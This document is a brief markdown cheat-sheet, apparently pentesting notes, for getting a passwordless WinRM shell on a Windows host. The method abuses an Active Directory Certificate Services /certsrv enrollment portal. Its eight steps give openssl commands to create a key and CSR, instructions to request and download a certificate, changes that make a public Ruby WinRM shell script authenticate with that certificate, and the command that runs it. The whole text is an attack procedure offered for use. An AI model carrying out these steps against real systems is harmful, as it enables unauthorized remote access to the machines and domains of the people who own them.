# ADCS WinRM Passwordless Session

### REQUIREMENTS: Have access to the /certsrv web portal (You can send a CSR for a certificate)

### STEPS:

#### 1) 

    openssl genrsa -des3 -out TARGET.key 2048 (Create private key)

#### 2) 

    openssl req -new -key TARGET.key -out TARGET.csr (Create Certificate Signing Request)

#### 3) 

    Access the /certsrv portal to request a certificate

#### 4) Click advanced certificate request, copy-paste the .csr file contents and leave everything as is.

#### 5) Download the certificate as Base64 Encoded

#### 6) Use https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb with a few modifications to use our certificates (Replace the username and password variables with :client_cert => 'certnew.cer', and :client_key => 'TARGET.key',

#### 7) 

    rlwrap ruby winrm_shell.rb

#### 8) Congratulations, we have a shell!

